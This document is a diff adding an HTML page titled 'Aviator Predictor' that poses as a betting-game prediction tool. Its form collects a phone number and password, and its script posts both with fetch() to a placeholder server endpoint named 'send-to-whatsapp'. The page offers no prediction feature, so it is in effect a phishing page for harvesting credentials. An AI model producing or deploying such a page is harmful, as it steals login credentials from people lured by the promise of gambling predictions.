@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aviator Predictor</title>
+</head>
+<body>
+    <h1>Aviator Predictor</h1>
+    <form id="aviatorForm">
+        <label for="phone">Enter your phone number:</label><br>
+        <input type="text" id="phone" name="phone" required><br><br>
+
+        <label for="password">Enter your password:</label><br>
+        <input type="password" id="password" name="password" required><br><br>
+
+        <button type="submit">Submit</button>
+    </form>
+
+    <script>
+        document.getElementById('aviatorForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            const phone = document.getElementById('phone').value;
+            const password = document.getElementById('password').value;
+
+            // Prepare data to send to the server
+            const data = {
+                phone: phone,
+                password: password
+            };
+
+            // Send data to your server (adjust the URL to your server endpoint)
+            fetch('https://your-server-endpoint.com/send-to-whatsapp', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Your data has been sent!');
+                } else {
+                    alert('Failed to send data.');
+                }
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                alert('Error sending data.');
+            });
+        });
+    </script>
+</body>
+</html>
